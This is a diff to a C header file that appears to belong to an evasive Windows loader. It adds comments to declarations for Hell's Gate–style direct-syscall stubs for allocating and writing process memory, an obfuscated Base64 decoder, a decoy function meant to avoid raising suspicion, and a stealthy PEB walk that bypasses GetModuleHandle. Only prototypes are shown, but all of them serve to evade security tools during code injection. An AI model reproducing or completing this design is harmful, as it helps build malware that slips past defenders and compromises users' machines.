@@ -6,19 +6,34 @@
 
 #define ARRAY_SIZE 1000
 
+// Function definition for modules.
 typedef HMODULE(WINAPI* pMod)(LPCSTR);
 
-DWORD GetSyid(LPCSTR functionName);
-
+/*
+Store the syscall id for external assembly functions.
+See syscalls.asm.
+*/ 
 extern DWORD smID;
 
+/*
+Retrieve syscall id.
+*/
+DWORD GetSyid(LPCSTR functionName);
+
+/*
+Set the syscall id.
+*/
 void SetSyid(DWORD value);
 
+/*
+Headers of assembly functions for direct syscalls.
+Inspired by Hells Gate methods.
+See definitions in syscalls.asm.
+*/
 extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
-
 extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
 
-// Base64Decode
+// Base64Decode function
 char* Bsfd(const char* encoded);
 
 /* Decoy function
@@ -28,8 +43,8 @@ It looks like legitimate processing activity without raising suspicion.
 void SortNumbers();
 
 /*
-Function to retrieve Function in Module using a stealthy PEB walk
-This doesn't rely on GetModuleHandle
+Function to retrieve Function in Module using a stealthy PEB walk.
+This doesn't rely on GetModuleHandle.
 */ 
 pMod GetMod(LPCSTR mod, LPCSTR fn);
 
